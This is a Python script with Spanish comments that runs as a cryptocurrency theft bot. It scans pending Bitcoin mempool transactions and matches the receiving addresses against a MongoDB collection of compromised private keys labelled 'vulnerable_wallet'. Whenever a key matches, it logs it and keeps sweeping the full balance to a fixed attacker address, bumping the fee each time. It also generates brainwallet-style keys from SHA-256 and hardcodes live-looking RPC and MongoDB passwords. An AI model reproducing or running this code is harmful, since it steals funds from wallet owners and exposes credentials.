import os
import hashlib
import requests
import json
from requests.auth import HTTPBasicAuth

import time
from bitcoinx import (
    private_key_to_public_key,
    pubkey_to_bitcoin_address,
    btcPrivatekeyHextoWIF,
)

from getz_input import (
    parseTx,
    getSignableTxn
)

from bit import Key
from bit.network import NetworkAPI

# RPC BTC
btcHost = '127.0.0.1'
auth = HTTPBasicAuth('anigametv', 'gotech2020')

from pymongo import MongoClient

# Configurar la conexión a MongoDB
client = MongoClient("mongodb://animeflv:Onyx01091995@onyx.i234.me:27017/")
db = client["admin"]  # Nombre de la base de datos
collection = db["vulnerable_wallet"]  # Nombre de la colección

# Crear un índice en el campo address para mejorar la eficiencia de las búsquedas
collection.create_index("address")

def buscar_wifMongoDB(address):
    """
    Busca el WIF correspondiente a una dirección en MongoDB.
    
    :param address: La dirección a buscar.
    :return: El WIF correspondiente a la dirección, o None si no se encuentra.
    """
    try:
        # Realizar la consulta buscando el address
        resultado = collection.find_one({"address": address}, {"_id": 0, "wif": 1})
        
        if resultado:
            return resultado["wif"]
        else:
            #print(f"Dirección {address} no encontrada.")
            return None

    except Exception as e:
        print(f"Error al buscar la dirección: {e}")
        return None


def agregar_contenido_txt(nombre_archivo, contenido):
    """
    Crea un archivo TXT si no existe y agrega contenido en una nueva línea.

    :param nombre_archivo: Nombre del archivo TXT (ej. "archivo.txt")
    :param contenido: Contenido a agregar al archivo
    """
    try:
        with open(nombre_archivo, 'a') as archivo:  # Modo 'a' para agregar contenido
            archivo.write(contenido + '\n')  # Agregar contenido con un salto de línea
    except Exception as e:
        print(f"Ocurrió un error al escribir en el archivo: {e}")


# Obtener Numero del Bloque
def get_latest_block_number():
    data = {
        "method": "getblockcount",
        "params": [],
        "id": 1
    }

    try:
        response = requests.post(f'http://{btcHost}:8332/', json=data, auth=auth, headers={'Content-Type': 'application/json'})
        response.raise_for_status()  # Raises an error for 4xx/5xx status codes
        result = response.json().get('result')
        return result
    except requests.exceptions.RequestException as e:
        return False



# Obtener el Fee de la Red
def get_highest_fee():
    # Establecemos el número de bloques para la estimación
    conf_target = 1  # Queremos una confirmación en 1 bloque
    estimate_mode = "CONSERVATIVE"  # Modo conservador para una estimación más segura

    data = {
        "method": "estimatesmartfee",
        "params": [conf_target, estimate_mode],  # Estimación para 1 bloque
        "id": 1
    }

    try:
        response = requests.post(f'http://{btcHost}:8332/', json=data, auth=auth, headers={'Content-Type': 'application/json'})
        response.raise_for_status()  # Raises an error for 4xx/5xx status codes
        result = response.json().get('result')
        if result and 'feerate' in result:
            fee_in_btc_per_kb = result['feerate']  # Tarifa estimada en BTC por kB
            fee_in_satoshis_per_kb = fee_in_btc_per_kb * 100_000_000  # Convertir a satoshis por kB
            fee_in_satoshis_per_byte = fee_in_satoshis_per_kb / 1000  # Convertir a satoshis por byte
            return fee_in_satoshis_per_byte  # Retorna la tarifa estimada en satoshis por byte
        else:
            print("No se pudo obtener la estimación de la tarifa.")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Error al obtener la tarifa estimada: {e}")
        return None




# Obtener Informacion del Bloque por el hash pasando el numero
def obtener_info_bloque(block_number):
    
    # Obtener el hash del bloque usando el número del bloque
    data = {
        "method": "getblockhash",
        "params": [block_number],
        "id": 1
    }

    try:
        response = requests.post(f'http://{btcHost}:8332/', json=data, auth=auth, headers={'Content-Type': 'application/json'})
        response.raise_for_status()
        block_hash = response.json().get('result')
        
        # Obtener la información del bloque usando el hash del bloque
        data = {
            "method": "getblock",
            "params": [block_hash],
            "id": 1
        }
        response = requests.post(f'http://{btcHost}:8332/', json=data, auth=auth, headers={'Content-Type': 'application/json'})
        response.raise_for_status()
        block_info = response.json().get('result')

        # Extraer hash del bloque y array de transacciones
        block_hash = block_info.get('hash')
        tx_array = block_info.get('tx')
        getmerkleroot = block_info.get('merkleroot')
        
        return block_hash, tx_array, getmerkleroot

    except requests.exceptions.RequestException as e:
        return None, [], None


# Obtener todas las direcciones del tx que son direcciones que estan recibiendo fondos
def get_transaction_addresses(txid=None, mode="vout"):
    """
    Obtiene las direcciones de una transacción en función del modo: entradas (vin) o salidas (vout).

    :param txid: ID de la transacción (txid)
    :param mode: "vin" para direcciones que envían, "vout" para direcciones que reciben
    :return: Lista de direcciones en función del modo seleccionado
    """
    if not txid:
        return {"error": "Debe proporcionar un txid válido."}

    data = {
        "method": "getrawtransaction",
        "params": [txid, True],  # Solicitar transacción decodificada
        "id": 1
    }

    try:
        # Realizar la solicitud al servidor Bitcoin (puedes cambiar 'btcHost' y 'auth' según corresponda)
        response = requests.post(f'http://{btcHost}:8332/', json=data, auth=auth, headers={'Content-Type': 'application/json'})
        response.raise_for_status()
        transaction_info = response.json().get('result')

        # Si no se encuentra la información de la transacción, devolver una lista vacía
        if not transaction_info:
            return []

        if mode == "vin":
            # Procesar direcciones de entrada (vin) - aunque no se tiene acceso directo a las direcciones de entrada
            vin_addresses = []
            for vin in transaction_info.get('vin', []):
                # Las entradas generalmente no contienen direcciones directas, pero se puede obtener el txid y vout.
                # Es necesario obtener más información de la transacción anterior si es necesario.
                vin_addresses.append(vin.get('txid'))  # Aquí sólo guardamos el txid de las entradas
            return vin_addresses

        elif mode == "vout":
            # Procesar direcciones de salida (vout)
            vout_addresses = []
            for vout in transaction_info.get('vout', []):
                address = vout.get('scriptPubKey', {}).get('address')  # Extraemos la dirección directamente de 'address'
                if address:
                    vout_addresses.append(address)

            return vout_addresses

        else:
            return []

    except requests.exceptions.RequestException as e:
        return []


# Obtener las transacciones pendiente que aun no esta en los bloque
def get_mempool_transactions():
    data = {
        "method": "getrawmempool",
        "params": [],  # Sin parámetros adicionales
        "id": 1
    }

    try:
        response = requests.post(f'http://{btcHost}:8332/', json=data, auth=auth, headers={'Content-Type': 'application/json'})
        response.raise_for_status()  # Verifica si la solicitud tuvo éxito
        result = response.json().get('result')
        return result  # Esto será una lista de IDs de transacciones pendientes
    except requests.exceptions.RequestException as e:
        print(f"Error fetching mempool transactions: {e}")
        return False

# Función para enviar todos los fondos
def send_all_funds(privateKeyWIF, destination_address):
    # Crear una clave a partir de la clave privada en formato WIF
    key = Key(privateKeyWIF)

    # Definir el fee normal en satoshis por byte
    normal_fee = get_highest_fee()  # Obtener el Fee en Satoshi por byte

    fee_increment = 1  # Incremento del fee en satoshis por byte (aumenta 1 satoshi por cada transacción)
    current_fee = normal_fee  # Iniciar con el fee normal en satoshis

    while True:
        # Verificar el saldo disponible
        balance = key.get_balance('btc')
        print(f"Saldo disponible: {balance} BTC")
        
        try:
            # Asegurarse de que balance es un número flotante
            balance = float(balance)
        except ValueError:
            print("Error: El saldo no es un número válido.")
            return

        # Si no hay saldo, salimos del bucle
        if balance <= 0:
            print("No hay fondos disponibles para enviar.")
            break  # Sale del bucle while si se cumple la condición

        try:
            # Crear la transacción con la tarifa configurada
            tx = key.create_transaction([], leftover=destination_address, replace_by_fee=False, absolute_fee=True, fee=current_fee)

            # Verificar que la transacción fue exitosa
            if tx:
                print(f"Transacción creada con éxito: {tx} : Fee: {current_fee}")
                # Confirmamos que el saldo ha cambiado y no hay fondos disponibles
                balance = key.get_balance('btc')  # Actualizamos el saldo
                print(f"Saldo actualizado: {balance} BTC")

                # Incrementar el fee después de cada transacción
                if balance > 0:
                    current_fee += fee_increment
                    print(f"Nuevo fee: {current_fee} satoshis por byte")

            else:
                print("No se pudo crear la transacción, sin detalles de la respuesta.")

        except Exception as e:
            print(f"Error al crear la transacción: {str(e)}")
        
        # Si el saldo se actualizó y se volvió cero, detenemos el bucle y restablecemos el fee
        if balance <= 0:
            print("Se han enviado todos los fondos disponibles.")
            current_fee = normal_fee  # Restablecer el fee al valor normal
            break  # Sale del bucle while si el saldo es 0

        # Esperar 2 segundos antes de intentar nuevamente hasta que quede en 0 BTC
        time.sleep(2)




# Función para generar direcciones y WIF
def generar_direcciones_y_wif(texto=None, isAddress=False):
    """
    Genera las direcciones Bitcoin (comprimida y sin comprimir) y sus WIFs a partir de un texto.

    :param texto: Cadena de texto base para generar el hash SHA-256.
    :param isAddress: Si es True, se genera una dirección; si es False, se genera una clave privada.
    :return: Diccionario con las direcciones y WIFs.
    """

    if texto is None:
        return False  # Si texto es None, devolvemos False

    if isAddress:
        # Generar el hash SHA-256 del texto
        hex_generate = hashlib.sha256(texto.encode()).hexdigest()
    else:
        # Usar el texto tal cual si isAddress es False
        hex_generate = texto


    # Convertir Hex a WIF (comprimida y sin comprimir)
    pk_wif_sin_comprimir, pk_wif_comprimida = btcPrivatekeyHextoWIF(hex_generate)
    
    # PrivateKey HEX to Pubkey (comprimida y sin comprimir)
    pubkey_sin_comprimir, pubkey_comprimida = private_key_to_public_key(hex_generate)
    
    # PubKey to Address (comprimida y sin comprimir)
    address_sin_comprimir = pubkey_to_bitcoin_address(pubkey_sin_comprimir)
    address_comprimida = pubkey_to_bitcoin_address(pubkey_comprimida)
    
    # Devolver los resultados en un diccionario
    return {
        "hash_hex": hex_generate,
        "wif_sin_comprimir": pk_wif_sin_comprimir,
        "wif_comprimida": pk_wif_comprimida,
        "direccion_sin_comprimir": address_sin_comprimir,
        "direccion_comprimida": address_comprimida,
    }


# Función para procesar todas las transacciones pendiente de la mempool
def procesar_bloque_y_transacciones():

    # Obtener todas las transacciones pendientes en la mempool, solo la direccion (Para) la que esta recibiendo fondos
    tx_hashes = get_mempool_transactions()
    if tx_hashes is None:
        return

    # Contar el total de transacciones en la lista
    total_transactions = len(tx_hashes)

    # Obtenemos las direcciones de las transacciones y les asignamos los WIFs, buscamos la direcciones de cada tx y asi buscamos en mongodb si existe la direccion entonces retiramos
    for i, tx_hash in enumerate(tx_hashes):

        # Muestra el progreso en la misma línea
        print(f"[Procesando] {i}/{total_transactions} Tx", end="\r")

        # del Txid sacamos las direcciones que estan recibiendo fondos (para)
        tx_direcciones = get_transaction_addresses(tx_hash)
        for addr in tx_direcciones:

            # Verificamos que no este vacio, esto devuelve la direccion que tiene los tx y que la direccion comienze con 1
            if addr and addr.startswith('1'): 

                #print(f"[Buscando MONGODB] {addr} :: Txid: {tx_hash}") 

                # Buscar en MongoDB, si existe retiramos saldo
                searchMongoDBWIF = buscar_wifMongoDB(addr)
                if searchMongoDBWIF:

                    print(f"[Nueva Transaccion] {addr} :: {searchMongoDBWIF}")

                    # Guardar la Wallet que se encontro con actividad reciente
                    agregar_contenido_txt('actividadBTC.txt', f"{addr} :: {searchMongoDBWIF}")

                    # Realizar Retiro
                    send_all_funds(searchMongoDBWIF, 'bc1qzsdnfmmqr5gadz5kqcead7z3hqqsvxm6rvfrlv')


        # Sleep a Cada Transaccion que se envia peticion
        time.sleep(0.001)


while True:

    # EJECUTAR PARA OBTENER TODAS LAS TRANSACCIONES PENDIENTE DE LA MEMPOOL
    procesar_bloque_y_transacciones()

    # Esperamos 5 Segundos luego de procesar todas las transacciones pendiente de la mempool
    time.sleep(5)